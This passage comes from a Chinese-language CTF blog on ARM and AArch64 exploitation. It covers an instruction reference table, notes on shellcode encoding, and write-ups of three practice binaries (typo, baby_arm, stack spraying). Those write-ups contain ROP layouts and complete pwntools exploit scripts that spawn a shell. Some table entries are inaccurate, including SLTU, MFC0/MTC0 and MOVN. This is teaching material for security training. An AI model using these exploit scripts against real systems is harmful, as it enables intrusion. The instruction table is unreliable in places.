<td align="left">一个寄存器中的内容与一个立即数相或</td>
<td align="left">ORIＲ1,Ｒ2,#3</td>
</tr>
<tr>
<td align="center">XOR</td>
<td align="left">异或运算，两个寄存器中的内容相异或</td>
<td align="left">XORＲ1,Ｒ2,Ｒ3</td>
</tr>
<tr>
<td align="center">XORI</td>
<td align="left">一个寄存器中的内容与一个立即数异或</td>
<td align="left">XORIＲ1,Ｒ2,#3</td>
</tr>
<tr>
<td align="center">BEQZ</td>
<td align="left">条件转移指令，当寄存器中内容为0时转移发生</td>
<td align="left">BEQZ R1,0</td>
</tr>
<tr>
<td align="center">BENZ</td>
<td align="left">条件转移指令，当寄存器中内容不为0时转移发生</td>
<td align="left">BNEZ R1,0</td>
</tr>
<tr>
<td align="center">BEQ</td>
<td align="left">条件转移指令，当两个寄存器内容相等时转移发生</td>
<td align="left">BEQ R1,R2</td>
</tr>
<tr>
<td align="center">BNE</td>
<td align="left">条件转移指令，当两个寄存器中内容不等时转移发生</td>
<td align="left">BNE R1,R2</td>
</tr>
<tr>
<td align="center">MOV.S</td>
<td align="left">把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td>
<td align="left">MOV.S F0,F1</td>
</tr>
<tr>
<td align="center">MOV.D</td>
<td align="left">把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td>
<td align="left">MOV.D F0,F1</td>
</tr>
<tr>
<td align="center">MFC0</td>
<td align="left">把一个数据从通用寄存器复制到特殊寄存器</td>
<td align="left">MFC0 R1,R2</td>
</tr>
<tr>
<td align="center">MTC0</td>
<td align="left">把一个数据从特殊寄存器复制到通用寄存器</td>
<td align="left">MTC0 R1,R2</td>
</tr>
<tr>
<td align="center">MFC1</td>
<td align="left">把一个数据从定点寄存器复制到浮点寄存器</td>
<td align="left">MFC1 R1,F1</td>
</tr>
<tr>
<td align="center">MTC1</td>
<td align="left">把一个数据从浮点寄存器复制到定点寄存器</td>
<td align="left">MTC1 R1,F1</td>
</tr>
<tr>
<td align="center">LUI</td>
<td align="left">把一个16位的立即数填入到寄存器的高16位，低16位补零</td>
<td align="left">LUI R1,#42</td>
</tr>
<tr>
<td align="center">DSLL</td>
<td align="left">双字逻辑左移</td>
<td align="left">DSLL R1,R2,#2</td>
</tr>
<tr>
<td align="center">DSRL</td>
<td align="left">双字逻辑右移</td>
<td align="left">DSRL R1,R2,#2</td>
</tr>
<tr>
<td align="center">DSRA</td>
<td align="left">双字算术右移</td>
<td align="left">DSRA R1,R2,#2</td>
</tr>
<tr>
<td align="center">DSLLV</td>
<td align="left">可变的双字逻辑左移</td>
<td align="left">DSLLV R1,R2,#2</td>
</tr>
<tr>
<td align="center">DSRLV</td>
<td align="left">可变的双字罗伊右移</td>
<td align="left">DSRLV R1,R2,#2</td>
</tr>
<tr>
<td align="center">DSRAV</td>
<td align="left">可变的双字算术右移</td>
<td align="left">DSRAV R1,R2,#2</td>
</tr>
<tr>
<td align="center">SLT</td>
<td align="left">如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0</td>
<td align="left">SLT R1,R2,R3</td>
</tr>
<tr>
<td align="center">SLTI</td>
<td align="left">如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0</td>
<td align="left">SLTI R1,R2,#23</td>
</tr>
<tr>
<td align="center">SLTU</td>
<td align="left">功能与SLT一致，但是带符号的</td>
<td align="left">SLTU R1,R2,R3</td>
</tr>
<tr>
<td align="center">SLTUI</td>
<td align="left">功能与SLT一致，但不带符号</td>
<td align="left">SLTUI R1,R2,R3</td>
</tr>
<tr>
<td align="center">MOVN</td>
<td align="left">如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器</td>
<td align="left">MOVN R1,R2,R3</td>
</tr>
<tr>
<td align="center">MOVZ</td>
<td align="left">如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器</td>
<td align="left">MOVZ R1,R2,R3</td>
</tr>
<tr>
<td align="center">TRAP</td>
<td align="left">根据地址向量转入管态</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">ERET</td>
<td align="left">从异常中返回到用户态</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">MADD.S</td>
<td align="left">一个双精度浮点数与单精度浮点数相乘加，结果为单精度</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">MADD.D</td>
<td align="left">一个双精度浮点数与单精度浮点数相乘加，结果为双精度</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">MADD.PS</td>
<td align="left">两个单精度浮点数相乘加，结果为单精度</td>
<td align="left"></td>
</tr>
</tbody></table>
<h2 id="shellcode-开发"><a href="#shellcode-开发" class="headerlink" title="shellcode 开发"></a>shellcode 开发</h2><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>有时 shellcode 内会含有 <code>\x00</code> ，换行，空格等坏字符，就造成输入或者复制等操作不能录入完整的 shellcode ，在坏字符处提前停止。</p>
<p>优化方法两种：指令优化和 shellcode 编码。指令优化就用无坏字符指令替代，重在积累。</p>
<p>编码算法主要是：BASE64、alpha_upper、xor，后两种比较容易实现常用。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210208204657.png" alt="image-20210208204657352"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210208204713.png" alt="image-20210208204713414"></p>
<h1 id="入门实战"><a href="#入门实战" class="headerlink" title="入门实战"></a>入门实战</h1><h2 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj - typo"></a>jarvisoj - typo</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>只打开 nx 保护，静态链接程序，没有符号表。<code>qemu-arm ./typo</code> 启动看看，是个打字程序，打字界面存在溢出。</p>
<p>ida 加载后搜索字符串，发现有 /bin/sh 和 system 。用 rizzo 提取 libc 符号表后导入到程序还原出 system 地址。</p>
<p>找 gadget 第一个参数在 r0 ，下一条命令在 pc ，找到 gadget <code>pop_r0_r4_pc</code> 。栈布局如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  padding    | &lt;- frame pointer</span><br><span class="line">+-------------+ </span><br><span class="line">|gadgets_addr | &lt;- return address</span><br><span class="line">+-------------+</span><br><span class="line">|binsh_addr   |</span><br><span class="line">+-------------+</span><br><span class="line">|junk_data    |</span><br><span class="line">+-------------+</span><br><span class="line">|system_addr  |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>

<p>本地调试用 gdb 的 cycli 功能得出溢出长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure>

<p>字符串输入不能和 amd 架构可以边调试边输入，要用脚本输入。最后得出 padding 112 。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./typo&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;./typo&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./typo&quot;])</span></span><br><span class="line">    <span class="comment">#p = process([&#x27;qemu-arm&#x27;,&quot;-g&quot;,&quot;1234&quot;,&quot;./typo&quot;])</span></span><br><span class="line">    p = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&quot;./typo&quot;</span>])</span><br><span class="line">elf = ELF(<span class="string">&quot;./typo&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_r0_r4_pc = <span class="number">0x00020904</span></span><br><span class="line">str_binsh = <span class="number">0x0006c384</span></span><br><span class="line">system = <span class="number">0x000110B4</span></span><br><span class="line">padding = <span class="number">112</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*padding + p32(pop_r0_r4_pc) + p32(str_binsh)*<span class="number">2</span> + p32(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;quit&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># p.sendline(&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2018-上海市大学生网络安全大赛-baby-arm"><a href="#2018-上海市大学生网络安全大赛-baby-arm" class="headerlink" title="2018 上海市大学生网络安全大赛 - baby_arm"></a>2018 上海市大学生网络安全大赛 - baby_arm</h2><h3 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h3><p>Aarch64 架构只打开 nx 保护，是个动态连接的程序，qemu 启动要用 -L 指定运行库：<code>qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn</code></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171646.png" alt="image-20210122121112367"></p>
<p>程序一共两次输入，第一次是输入到 bss 段，第二次存在栈溢出。</p>
<p>看一看栈溢出部分汇编，aarch64 栈分布与 x86 有点不一样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var_50          &#x3D; -0x50</span><br><span class="line">STP             X29, X30, [SP,#var_50]!;压栈将x29x30压入sp-0x50，之后将sp更新为sp-0x50</span><br><span class="line">MOV             X29, SP;新栈基地址</span><br><span class="line">ADD             X0, X29, #0x10;x0&#x3D;x29-0x10</span><br><span class="line">MOV             X2, #0x200 ; nbytes</span><br><span class="line">MOV             X1, X0  ; buf</span><br><span class="line">MOV             W0, #0  ; fd</span><br><span class="line">BL              .read</span><br><span class="line">NOP</span><br><span class="line">LDP             X29, X30, [SP+0x50+var_50],#0x50;出栈</span><br><span class="line">RET</span><br></pre></td></tr></table></figure>

<p>这里栈溢出的话不能修改 sub_4007F0 的 rip ，修改的是上层函数的返回地址。利用 mprotect 给 bss 写入位置加上运行权限。mprotect 需要 3 个参数，对应 x0-x3 寄存器，ROPgadget 没有找到合适的。</p>
<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>在 start 函数中找到 init 函数：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171647.png" alt="image-20210122140550188"></p>
<p>结构体和 x86 的差不多：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171648.png" alt="image-20210122141146030"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171649.png" alt="image-20210122141034176"></p>
<p>0x4008CC 开始从栈上提取值到寄存器，读懂寻址方式就行。栈溢出填充变量后马上调用 0x4008CC 变量在内存布局如下：</p>
<table>
<thead>
<tr>
<th align="center">内存地址</th>
<th align="center">内存布局</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">低</td>
<td align="center">……</td>
<td>padding</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">……</td>
<td>Rbp</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">0x4008CC</td>
<td>Rip</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X29</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X30</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X19</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X20</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X21</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X22</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X23</td>
<td></td>
</tr>
<tr>
<td align="center">高</td>
<td align="center">X24</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td></td>
</tr>
</tbody></table>
<p>然后就是 0x4008AC 给参数寄存器赋值并调用函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure>

<ol>
<li><p>执行<code>LDR X3,[X21,X19,LSL#3]</code>，那么此句汇编的意义是，将X19的值逻辑左移(Logical Shift Left)三位后加上X21的值，<strong>取其所指向的值</strong>存储在X3寄存器中。控制 x19 为 0 ，就变成 <code>LDR X3,[X21]</code> 。</p>
</li>
<li><p>把 X22 寄存器的值作为第三个参数 x2 ；把 X23 寄存器的值作为第二个参数 x1 ；把 X24 寄存器的值（低32位）作为第一个参数 x0 ；</p>
</li>
<li><p>给 X19 寄存器的值加一，调用 X3 寄存器<strong>所指向</strong>的函数，也就需要找个已知地址的地方写入 plt 。</p>
</li>
<li><p>比较 x19 和 x20 ，不相等就再次调用 0x4008AC ，所用 x20 控制为 1 。</p>
</li>
</ol>
<p>最后得出对照表：</p>
<table>
<thead>
<tr>
<th align="center">内存地址</th>
<th align="center">内存布局</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">低</td>
<td align="center">……</td>
<td>padding</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">……</td>
<td>Rbp</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">0x4008CC</td>
<td>Rip</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X29</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X30</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X19</td>
<td>固定值：0</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X20</td>
<td>固定值：1</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X21</td>
<td>存储调用函数地址：X3</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X22</td>
<td>第三个参数：X2</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X23</td>
<td>第二个参数：X1</td>
</tr>
<tr>
<td align="center">高</td>
<td align="center">X24</td>
<td>第一个参数：W0(X0低32位)</td>
</tr>
</tbody></table>
<p>修改完权限之后还需要调用在 bss 段上的 shellcode ，就在上面 payload 上再加调用就行了，得出最后的 payload ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span> </span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)              <span class="comment"># X19</span></span><br><span class="line">payload += p64(<span class="number">0x4008CC</span>)                <span class="comment"># X20</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x4008AC</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)               <span class="comment"># X19 , X20</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span> + <span class="number">0x100</span>)         <span class="comment"># X21</span></span><br><span class="line">payload += p64(<span class="number">0x7</span>)                      <span class="comment"># X22</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>)                   <span class="comment"># X23</span></span><br><span class="line">payload += p64(<span class="number">0x411000</span>)                 <span class="comment"># X24</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">0x6</span>                  <span class="comment"># X19 - X24</span></span><br></pre></td></tr></table></figure>

<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/aarch64-linux-gnu/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell_code = asm(shellcraft.sh())</span><br><span class="line">shell_code = shell_code.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">shell_code = shell_code + p64(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span> </span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)              <span class="comment"># X19</span></span><br><span class="line">payload += p64(<span class="number">0x4008CC</span>)                <span class="comment"># X20</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x4008AC</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)               <span class="comment"># X19 , X20</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span> + <span class="number">0x100</span>)         <span class="comment"># X21</span></span><br><span class="line">payload += p64(<span class="number">0x7</span>)                      <span class="comment"># X22</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>)                   <span class="comment"># X23</span></span><br><span class="line">payload += p64(<span class="number">0x411000</span>)                 <span class="comment"># X24</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">0x6</span>                  <span class="comment"># X19 - X24</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">p.sendline(shell_code)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="root-me-stack-spraying"><a href="#root-me-stack-spraying" class="headerlink" title="root_me_stack_spraying"></a>root_me_stack_spraying</h2><h3 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h3><p>32 位 arm 架构动态链接程序，打开 nx 保护。存在 scanf 函数栈溢出漏洞。通过调试测试得出溢出 0x44 后，就能控制 pc 寄存器。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171650.png" alt="image-20210124201022270"></p>
<p>程序中有后门函数：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171651.png" alt="image-20210124201322884"></p>
<p>ROPgadget 查询如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x00010634 : pop &#123;fp, pc&#125;</span><br><span class="line">0x0001055c : pop &#123;r0, r1, r4, r8, fp, ip, sp, pc&#125;</span><br><span class="line">0x000103f8 : pop &#123;r3, pc&#125;</span><br><span class="line">0x000105b0 : pop &#123;r4, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>

<p>结合 main 函数中 scanf 附件汇编指令，利用 pop_r3_pc 这个 gadget 可以控制 scanf 实现任意地址写。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171652.png" alt="image-20210124203121632"></p>
<p>程序中现成有 system ，这里就向 bss 写入 <code>/bin/sh\x00</code> 作为参数调用。然后就是控制 r0 的值，先用 gadget 控制 r3 的值，接着将程序控制到 <code>0x1067c</code> 从而控制 r0 。</p>
<p>程序劫持到 <code>0x1067c</code> 之后就会一直执行下去，遇到 <code>0x10684</code> 的话就会从 r11 上取值给 pc 而不是用 bss 段上的数据，所以这里还需要提前向 r11 写入一个存储着 exec 函数地址的地址，这个在写入 bss 时一起实现。两段 payload 分别是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(padding-<span class="number">4</span>) + p32(elf.bss() + <span class="number">0x300</span>)</span><br><span class="line">payload1 += p32(pop_r3_pc)</span><br><span class="line">payload1 += p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>*<span class="number">3</span>)  <span class="comment"># R3:write address</span></span><br><span class="line">payload1 += p32(main_scanf)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;/bin/sh\x00&quot;</span> + p32(elf.sym[<span class="string">&#x27;exec&#x27;</span>])</span><br><span class="line">payload2 += p32(pop_r3_pc) + p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>*<span class="number">3</span>) + p32(<span class="number">0x0001067C</span>)</span><br><span class="line">payload2 += p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>) + p32(<span class="number">0x0001067C</span>)</span><br></pre></td></tr></table></figure>

<p>实际调试时发现 exec 前面几条函数会覆盖 <code>/bin/sh\x00</code> 前面的四个字节，不过问题不大，将其修改为 <code>xxxx;sh\x00</code> 即可。</p>
